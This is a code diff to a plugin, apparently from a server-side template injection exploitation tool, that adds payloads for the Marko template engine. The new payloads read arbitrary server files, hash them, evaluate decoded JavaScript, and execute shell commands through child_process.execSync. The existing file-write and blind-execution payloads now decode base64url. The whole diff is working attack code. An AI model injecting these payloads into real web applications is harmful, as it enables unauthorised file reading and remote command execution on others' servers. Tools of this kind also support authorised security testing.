@@ -1,22 +1,38 @@
 from plugins.languages import javascript
+from utils import rand
 
 
 class Marko(javascript.Javascript):
     def init(self):
         self.update_actions({
             'render': {
-                'render': '${{{code}}}',
+                'render': '{code}',
                 'header': '${{"{header}"}}',
                 'trailer': '${{"{trailer}"}}',
+                'test_render': f'${{typeof({rand.randints[0]})+{rand.randints[1]}}}',
+                'test_render_expected': f'number{rand.randints[1]}'
             },
             'write': {
                 'call': 'inject',
-                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64}','base64'),'binary')}}""",
+                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64}','base64url'),'binary')}}""",
                 'truncate': """${{require('fs').writeFileSync('{path}','')}}"""
+            },
+            'read': {
+                'call': 'render',
+                'read': """${{require('fs').readFileSync('{path}').toString('base64')}}"""
+            },
+            'md5': {
+                'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest(\"hex\")}}"
+            },
+            'evaluate': {
+                'evaluate': """${{eval(Buffer('{code_b64}', 'base64url').toString())}}"""
+            },
+            'execute': {
+                'execute': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString())}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}')}}"""
+                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}')}}"""
             },
         })
 
